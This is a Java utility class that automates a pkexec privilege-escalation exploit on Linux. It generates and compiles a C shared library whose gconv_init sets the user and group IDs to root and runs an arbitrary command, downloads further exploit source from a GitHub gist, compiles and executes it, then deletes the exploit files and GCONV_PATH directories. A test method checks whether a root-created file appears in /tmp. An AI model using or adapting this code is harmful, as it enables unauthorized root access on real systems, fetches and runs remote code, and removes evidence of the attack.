package gq.glowman554.utils;

import java.io.File;
import java.io.IOException;

public class PKExecPEUtils {

    private static void delete(String file) {
        Log.log("delete: " + file);
        new File(file).delete();
    }

    public static String perform(String command) throws IOException, InterruptedException {
        String command_base = command.split(" ")[0];

        StringBuilder payload_code = new StringBuilder();

        payload_code.append("#include <stdio.h>\n");
        payload_code.append("#include <stdlib.h>\n");
        payload_code.append("#include <unistd.h>\n");
        payload_code.append("void gconv() {}\n");

        payload_code.append("void gconv_init() {\n");

        payload_code.append("\tsetuid(0);\n");
        payload_code.append("\tseteuid(0);\n");
        payload_code.append("\tsetgid(0);\n");
        payload_code.append("\tsetegid(0);\n");

        payload_code.append("\tstatic char *a_argv[] = {\n");

        for (String command_part : command.split(" ")) {
            payload_code.append(String.format("\t\t\"%s\",\n", command_part));
        }

        payload_code.append("\t\tNULL\n");
        payload_code.append("\t};\n");

        payload_code.append("\tstatic char *a_envp[] = { \"PATH=/bin:/usr/bin:/sbin\", NULL };\n");
        payload_code.append("\texecve(\"" + command_base + "\", a_argv, a_envp);\n");
        payload_code.append("\texit(0);\n");
        payload_code.append("}\n");

        FileUtils.writeFile("payload.c", payload_code.toString());
        ExecUtils.exec("gcc -o payload.so -shared -fPIC payload.c");

        FileUtils.writeFile("exploit.c", HttpUtils.request("https://gist.githubusercontent.com/Glowman554/c66e1014314d1dc2c60ed98022db584f/raw/f720abc9d614c2fe62adf364d4beef9843acbb22/exploit.c"));

        ExecUtils.exec("gcc -o exploit.elf exploit.c");

        String res = ExecUtils.exec("./exploit.elf");

        delete("exploit.c");
        delete("exploit.elf");
        delete("payload.c");
        delete("payload.so");
        delete("GCONV_PATH=./lol");
        delete("GCONV_PATH=.");
        delete("lol/gconv-modules");
        delete("lol");

        return res;
    }

    public static boolean test() throws IOException, InterruptedException {
        if (new File("/tmp/pkexec_pe_test").exists()) {
            new File("/tmp/pkexec_pe_test").delete();
        }

        perform("/bin/touch /tmp/pkexec_pe_test");

        return new File("/tmp/pkexec_pe_test").exists();
    }
}
